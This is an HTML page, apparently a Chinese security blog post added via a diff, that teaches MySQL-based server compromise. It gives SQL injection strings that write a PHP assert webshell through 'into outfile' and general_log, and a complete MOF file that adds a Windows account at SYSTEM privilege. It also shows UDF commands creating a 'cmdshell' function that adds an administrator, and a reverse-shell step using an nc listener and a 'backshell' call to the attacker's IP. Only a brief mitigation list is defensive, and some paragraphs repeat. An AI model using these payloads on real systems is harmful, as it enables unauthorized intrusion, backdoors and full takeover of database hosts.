@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="白仁的博客" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="MYSQL写Webshell写Webshell比较常见的方法有：  select … into outfile general_log   select … into outfile1.利用条件 对web目录有写权限 GPC关闭（能使用单引号） 有绝对路径（读文件可以不用，写文件必须） 没有配置 –secure-file-priv  2.利用方式 有 union  12id=2) union se">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MYSQL提权">
+<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;02&#x2F;MYSQL%E6%8F%90%E6%9D%83&#x2F;index.html">
+<meta property="og:site_name" content="白仁的博客">
+<meta property="og:description" content="MYSQL写Webshell写Webshell比较常见的方法有：  select … into outfile general_log   select … into outfile1.利用条件 对web目录有写权限 GPC关闭（能使用单引号） 有绝对路径（读文件可以不用，写文件必须） 没有配置 –secure-file-priv  2.利用方式 有 union  12id=2) union se">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-03-02T02:55:26.838Z">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://bai-ren-1.github.io/2020/03/02/MYSQL提权/"/>
+
+
+
+
+
+  <title>MYSQL提权 | 白仁的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">白仁的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2020/03/02/MYSQL%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="白仁">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="白仁的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">MYSQL提权</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-02T15:58:51+08:00">
+                2020-03-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="MYSQL写Webshell"><a href="#MYSQL写Webshell" class="headerlink" title="MYSQL写Webshell"></a>MYSQL写Webshell</h1><p>写Webshell比较常见的方法有：</p>
+<ul>
+<li>select … into outfile</li>
+<li>general_log</li>
+</ul>
+<hr>
+<h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><h3 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1.利用条件"></a>1.利用条件</h3><ul>
+<li>对web目录有写权限</li>
+<li>GPC关闭（能使用单引号）</li>
+<li>有绝对路径（读文件可以不用，写文件必须）</li>
+<li>没有配置 <code>–secure-file-priv</code></li>
+</ul>
+<h3 id="2-利用方式"><a href="#2-利用方式" class="headerlink" title="2.利用方式"></a>2.利用方式</h3><ul>
+<li>有 <code>union</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2) union select 1,2,3,4,5,6,7,&apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’ into outfile ‘/home/wwwroot/shadowyspirits/evil.php’%23</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>无 <code>union</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2) into outfile ‘/home/wwwroot/shadowyspirits/evil.php’ fields terminated by ‘&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’%23</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>fields terminated by</code> 是用来指定列之间分隔符，如果查询结果为单列则不会插入分隔符，所以必须有多个列才能成功写入一句话。</p>
+<hr>
+<h2 id="general-log"><a href="#general-log" class="headerlink" title="general_log"></a>general_log</h2><h4 id="1-利用条件-1"><a href="#1-利用条件-1" class="headerlink" title="1.利用条件"></a>1.利用条件</h4><ul>
+<li>对web目录有写权限</li>
+<li>GPC关闭（能使用单引号）</li>
+<li>有绝对路径（读文件可以不用，写文件必须）</li>
+<li>需要能执行多行sql语句</li>
+</ul>
+<h3 id="2-利用方式-1"><a href="#2-利用方式-1" class="headerlink" title="2.利用方式"></a>2.利用方式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=<span class="string">'on'</span>;</span><br><span class="line">SET <span class="keyword">global</span> general_log_file=<span class="string">'/home/wwwroot/shadowyspirits/evil.php'</span>;</span><br><span class="line">SELECT <span class="string">'&lt;?php assert($_POST["cmd"]);?&gt;'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>设置了 <code>general_log</code> 和 <code>general_log_file</code> 之后所有SQL记录都会写入指定的文件，所以会导致 log 文件非常大，推荐只暂时打开</p>
+<p>需要注意的是 <code>secure_file_priv</code> 是只读属性，如果试图使用 <code>set global</code> 修改会报如下 Error</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error Code: 1238. Variable &apos;secure_file_priv&apos; is a read only</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="防御姿势"><a href="#防御姿势" class="headerlink" title="防御姿势"></a>防御姿势</h2><ul>
+<li>设置 <code>secure_file_prive = null</code> （不允许导入和导出）</li>
+<li>防止暴露网站绝对路径</li>
+<li>正确设置 web 目录权限，除 log、upload 等目录外不授予写权限，upload </li>
+<li>目录不授予执行权限</li>
+</ul>
+<hr>
+<h1 id="MYSQL提权"><a href="#MYSQL提权" class="headerlink" title="MYSQL提权"></a>MYSQL提权</h1><p>MYSQL提权一般有三种方法：</p>
+<ul>
+<li>mof提权</li>
+<li>udf提权</li>
+<li>反弹shell</li>
+</ul>
+<hr>
+<h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>在windows平台下，<code>c:/windows/system32/wbem/mof/nullevt.mof</code>这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</p>
+<h3 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul>
+<li>mysql用户具有root权限(对上面那个目录可写）</li>
+<li>关闭了<code>secure-file-priv</code></li>
+</ul>
+<h3 id="3-利用方式"><a href="#3-利用方式" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><p>下面是一段写好了的mof利用代码</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace("\\\\.\\root\\subscription") </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123; </span><br><span class="line">	EventNamespace = "Root\\Cimv2"; </span><br><span class="line">	Name  = "filtP2"; </span><br><span class="line">    Query = "Select \ From __InstanceModificationEvent "  </span><br><span class="line">            "Where TargetInstance Isa \"Win32_LocalTime\" " </span><br><span class="line">            "And TargetInstance.Second = <span class="number">5</span>"; </span><br><span class="line">	QueryLanguage = "WQL"; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = "consPCSV2"; </span><br><span class="line">	ScriptingEngine = "JScript"; </span><br><span class="line">	ScriptText = "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"<span class="built_in">net</span>.exe user admin admin /add")"; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer;  </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为<code>nullevt.mof</code>上传到任意一个你在目标机上可写的路径(当然，如果你直接可以写到<code>c:/windows/system32/wbem/mof/</code>就更好了)，接下来我们就可以直接执行sql语句把该文件写入到目标路径：</p>
+<p>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为nullevt.mof上传到任意一个你在目标机上可写的路径(当然，如果你直接可以写到c:/windows/system32/wbem/mof/就更好了)，接下来我们就可以直接执行sql语句把该文件写入到目标路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;你上传的路径/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</span><br></pre></td></tr></table></figure>
+
+
+<p>执行完后，你可以在你的webshell里执行使用net user查看是否多了一个admin用户，如果有则说明可以利用，否则就不需要继续了。</p>
+<hr>
+<h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><h3 id="1-原理-1"><a href="#1-原理-1" class="headerlink" title="1.原理"></a>1.原理</h3><p>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限</p>
+<h3 id="2-利用条件-1"><a href="#2-利用条件-1" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul>
+<li>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的<code>lib\plugin</code>文件夹下。</li>
+<li>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于<code>c:\windows\system32</code>，在windows2000下放置于c:\winnt\system32。</li>
+<li>掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备`root账号所具备的权限的其它账号也可以。</li>
+<li>可以将udf.dll写入到相应目录的权限。</li>
+</ul>
+<blockquote>
+<p>注：关于plugin目录，可在mysql中执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%plugin%&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>进行查看，这个目录也就是dll文件需要导入的目录</p>
+</blockquote>
+<h3 id="3-利用方式-1"><a href="#3-利用方式-1" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><ul>
+<li>将dll文件导入到相应目录，如果导入错误会产生<code>cant open shared library</code>错误</li>
+<li>创建自定义函数</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</span><br><span class="line">select cmdshell(&apos;net user miao zjicmisa.org /add&apos;);</span><br><span class="line">select cmdshell(&apos;net localgroup administrators miao /add&apos;);</span><br><span class="line">drop function cmdshell; 删除函数</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;  删除函数</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意这里的函数名应该与dll文件中的函数名一致。</p>
+</blockquote>
+<p>当然关于udf有一个特别需要注意的问题，就是5.1以上版本默认情况下<code>/lib/plugin</code>目录是不存在的，还好有大牛已经想出了解决办法——<code>NTFS ADS流</code>来创建文件夹（该方法我们测试过）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   </span><br><span class="line">//查找到mysql的目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;;   </span><br><span class="line">//利用NTFS ADS创建lib目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br><span class="line">//利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：udf提权也是一般应用于win2000、win2003系统</p>
+</blockquote>
+<hr>
+<h2 id="反弹shell提权"><a href="#反弹shell提权" class="headerlink" title="反弹shell提权"></a>反弹shell提权</h2><p>其实这也属于udf提权，只不过应用场景不同，比如现在我们没有webshell但是我们却有偶然得到了mysql的root密码（弱口令等），恰巧目标机的数据库可以外联或者有phpmyadmin，那么我们就可以把上面<code>udf.dll</code>文件的内容先插入到数据表中，然后再导出到<code>/lib/plugin</code>目录。</p>
+<blockquote>
+<p>注：这里我看到网上的资料都是讲mysql.txt导入到数据库中，mysql.txt也就是udf.dll文件的2进制转换为16进制，这里我不太清楚为什么需要转成十六进制，但是我知道如果udf.dll文件成功导入到plugin目录是可以成功反弹shell的</p>
+</blockquote>
+<ul>
+<li>创建函数backshell</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &apos;mysqldll.dll&apos;; //创建backshell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在具备独立主机的服务器上执行监听</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 12345</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行backshell</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell("你的ip地址",12345);</span><br></pre></td></tr></table></figure>
+
+<p>最后就是执行backshell<br>select backshell(“你的ip地址”,12345);<br>1</p>
+<p>在具备独立主机的服务器上执行监听<br>nc -vv -l -p 12345<br>1<br>最后就是执行backshell<br>select backshell(“你的ip地址”,12345);<br>1</p>
+<p>但是我是通过webshell将udf.dll导入plugin目录完成的，如果成功返回了shell则说明成功了，我们就可以添加用户了</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/" rel="next" title="物理内存和虚拟内存的联系与区别">
+                <i class="fa fa-chevron-left"></i> 物理内存和虚拟内存的联系与区别
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">白仁</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MYSQL写Webshell"><span class="nav-number">1.</span> <span class="nav-text">MYSQL写Webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#select-…-into-outfile"><span class="nav-number">1.1.</span> <span class="nav-text">select … into outfile</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-利用条件"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-利用方式"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.利用方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#general-log"><span class="nav-number">1.2.</span> <span class="nav-text">general_log</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-利用条件-1"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">1.利用条件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-利用方式-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.利用方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御姿势"><span class="nav-number">1.3.</span> <span class="nav-text">防御姿势</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MYSQL提权"><span class="nav-number">2.</span> <span class="nav-text">MYSQL提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mof提权"><span class="nav-number">2.1.</span> <span class="nav-text">mof提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-原理"><span class="nav-number">2.1.1.</span> <span class="nav-text">1.原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-利用条件"><span class="nav-number">2.1.2.</span> <span class="nav-text">2.利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-利用方式"><span class="nav-number">2.1.3.</span> <span class="nav-text">3.利用方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#udf提权"><span class="nav-number">2.2.</span> <span class="nav-text">udf提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-原理-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">1.原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-利用条件-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-利用方式-1"><span class="nav-number">2.2.3.</span> <span class="nav-text">3.利用方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反弹shell提权"><span class="nav-number">2.3.</span> <span class="nav-text">反弹shell提权</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">白仁</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
